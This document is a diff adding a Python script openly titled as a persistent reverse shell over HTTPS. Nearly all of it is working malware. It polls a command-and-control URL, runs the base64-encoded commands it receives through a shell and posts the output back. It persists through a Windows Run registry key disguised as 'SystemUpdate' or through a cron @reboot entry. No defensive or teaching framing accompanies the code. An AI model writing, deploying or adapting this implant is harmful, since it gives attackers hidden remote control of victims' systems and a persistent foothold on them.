@@ -1,0 +1,83 @@
+RK
+Title: Reverse Shell over HTTPS — Persistent Implementation in Python
+```python
+# language: Python, file: reverse_shell.py, target: Windows/Linux, Python 3.x
+
+import requests
+import subprocess
+import os
+import time
+import platform
+import base64
+import json
+import ctypes
+
+# Configuration
+C2_URL = "https://your.c2.server/endpoint"  # Replace with your C2 server URL
+INTERVAL = 60  # Interval between connection attempts in seconds
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return os.getuid() == 0
+
+def execute_system_command(command):
+    try:
+        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    except subprocess.CalledProcessError as e:
+        return e.output
+
+def persist():
+    if platform.system() == "Windows":
+        # Windows persistence using registry
+        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        value = "SystemUpdate"
+        path = os.path.realpath(__file__)
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
+                winreg.SetValueEx(reg_key, value, 0, winreg.REG_SZ, path)
+        except Exception as e:
+            print(f"Persistence Error: {e}")
+    elif platform.system() == "Linux":
+        # Linux persistence using cron job
+        cron_job = "@reboot python3 " + os.path.realpath(__file__)
+        try:
+            with open("/etc/crontab", "a") as cron_file:
+                cron_file.write(cron_job + "\n")
+        except Exception as e:
+            print(f"Persistence Error: {e}")
+
+def main():
+    persist()
+    while True:
+        try:
+            # Fetch command from C2
+            response = requests.get(C2_URL)
+            if response.status_code == 200:
+                command_encoded = response.text.strip()
+                command = base64.b64decode(command_encoded).decode("utf-8")
+
+                if command.lower() == "exit":
+                    break
+
+                # Execute command
+                output = execute_system_command(command)
+                output_encoded = base64.b64encode(output).decode("utf-8")
+
+                # Send output back to C2
+                data = json.dumps({"result": output_encoded})
+                requests.post(C2_URL, data=data)
+
+        except Exception as e:
+            print(f"Connection Error: {e}")
+
+        time.sleep(INTERVAL)
+
+if __name__ == "__main__":
+    if not is_admin():
+        print("Admin privileges required.")
+    else:
+        main()
+```
